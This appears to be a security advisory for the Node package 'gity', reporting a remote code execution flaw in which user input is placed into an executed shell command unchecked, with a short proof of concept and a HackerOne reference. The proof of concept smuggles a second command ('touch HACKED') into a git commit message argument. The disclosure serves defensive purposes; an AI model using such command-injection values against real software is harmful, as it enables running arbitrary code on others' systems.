  title: Remote Code Execution (RCE)
  description: "[gity][1] is a Git wrapper for Node.\n\nAffected versions of this
    package are vulnerable to Remote Code\nExecution (RCE). A user input is formatted
    inside a command that will be\nexecuted without any check.\n\n### PoC by mik317
    \  {#poc-by-mik317}\n\n* Create the following PoC file:\n      // poc.js\n      var
    Git = require('gity');\n\nvar git = Git() .add(\\'\\*.js\\') .commit(\\'-m \\\"added
    js files\\\";touch\nHACKED;#\\') .run();\n\n    \n    * Check there aren't files
    called `HACKED`\n    * Execute the following commands in another terminal:\n\nnpm
    i gity # Install affected module node poc.js # Run the PoC\n\n    * Recheck the
    files: now `HACKED` has been created\n    ## Remediation\n    There is no fixed
    version for `gity`.\n    ## References\n    - [HackerOne Report](https://hackerone.com/reports/730111)\n
